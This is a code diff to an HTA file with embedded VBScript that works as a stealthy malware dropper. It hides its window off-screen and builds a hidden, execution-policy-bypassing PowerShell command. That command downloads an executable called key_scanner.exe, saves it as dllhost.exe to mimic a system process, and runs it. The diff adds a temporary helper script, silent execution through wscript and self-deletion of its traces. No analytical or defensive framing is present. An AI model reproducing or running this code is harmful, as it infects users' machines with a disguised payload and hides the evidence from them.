@@ -17,20 +17,24 @@
   ' ==== ENSURE WINDOW NEVER APPEARS ====
   Window.resizeTo 0,0
   Window.moveTo -2000,-2000
+  
+  ' ==== METHOD 1: ULTRA-SILENT POWERSHELL EXECUTION ====
   Set WshShell = CreateObject("WScript.Shell")
-  
-  ' ==== METHOD 1: MOST RELIABLE (POWERSHELL) ====
   psCommand = "powershell -NoP -NonI -W Hidden -Exec Bypass ""$p='%temp%\dllhost.exe';" & _
-              "(New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p);" & _
-              "Start-Process -WindowStyle Hidden $p"""
+              "try{(New-Object Net.WebClient).DownloadFile('https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe',$p);" & _
+              "if(Test-Path $p){Start-Process -WindowStyle Hidden $p}}catch{}"""
   
-  ' ==== METHOD 2: ALTERNATIVE (BITSADMIN) ====
-  ' psCommand = "cmd /q /c bitsadmin /transfer job /download /priority high " & _
-  '             "https://example.com/payload.exe %temp%\dllhost.exe & start /b %temp%\dllhost.exe"
+  ' ==== EXECUTE THROUGH WSCRIPT (NO FLASH) ====
+  WshShell.Run "wscript.exe //E:vbscript //B ""C:\Windows\Temp\runner.vbs""", 0, False
   
-  ' ==== EXECUTE COMPLETELY SILENTLY ====
-  WshShell.Run "mshta vbscript:Execute(""CreateObject('WScript.Shell').Run """ & psCommand & """,0:close"")", 0, False
+  ' Create helper VBS to run PowerShell
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Set file = fso.CreateTextFile("C:\Windows\Temp\runner.vbs", True)
+  file.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
+  file.WriteLine "WshShell.Run """ & psCommand & """, 0, False"
+  file.Close
   
-  ' ==== FORCE CLOSE HTA ====
-  window.setTimeout "Self.Close()", 500
+  ' ==== SELF-CLEANUP ====
+  window.setTimeout "Self.Close()", 3000
+  window.setTimeout "fso.DeleteFile(""C:\Windows\Temp\runner.vbs"")", 5000
 </script>
